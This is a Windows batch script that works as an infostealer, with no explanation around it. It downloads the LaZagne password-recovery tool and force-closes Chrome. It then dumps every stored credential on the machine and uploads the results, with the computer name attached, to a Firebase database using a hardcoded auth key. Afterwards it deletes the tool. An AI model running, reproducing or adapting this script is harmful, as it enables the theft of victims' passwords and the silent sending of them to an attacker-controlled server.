@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion
set "LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZAGNE_EXE=%TEMP%\LaZagne.exe"
set "OUTPUT_DIR=%TEMP%\Lazagne_Results"
set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials"
set "FIREBASE_KEY=fdM9pHfanpouiqsEmFLJUDAC2LtXF7rUBXbIPDA4"

echo Script started: %DATE% %TIME%
if not exist "%LAZAGNE_EXE%" (
    powershell -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'"
    if errorlevel 1 exit /b 1
    if not exist "%LAZAGNE_EXE%" exit /b 1
)
pause
tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I "chrome.exe" >NUL
if %errorlevel% == 0 taskkill /IM chrome.exe /F >nul 2>&1
pause
if not exist "%OUTPUT_DIR%" (
    mkdir "%OUTPUT_DIR%" 2>nul
    if errorlevel 1 exit /b 1
)
pause
if not exist "%LAZAGNE_EXE%" exit /b 1
"%LAZAGNE_EXE%" all -oN -output "%OUTPUT_DIR%" >nul 2>&1
if errorlevel 1 exit /b 1
for /f "delims=" %%F in ('dir /b /a-d /od "%OUTPUT_DIR%\*.txt" 2^>nul') do set "RESULT_FILE=%%F"
if not defined RESULT_FILE exit /b 1
pause
set "PC_NAME=%COMPUTERNAME%"
set "PC_NAME=!PC_NAME: =_!"
set "PC_NAME=!PC_NAME:-=_!"
powershell -Command "$content=Get-Content -Raw -Path '%OUTPUT_DIR%\%RESULT_FILE%'; $json=@{'computer'='%PC_NAME%';'timestamp'='%DATE% %TIME%';'data'=$content} | ConvertTo-Json -Compress; $response=Invoke-RestMethod -Uri '%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%' -Method PUT -Body $json -ContentType 'application/json'"
if errorlevel 1 exit /b 1
pause
del /q "%LAZAGNE_EXE%" >nul 2>&1
echo Done: %DATE% %TIME%
pause
exit /b 0
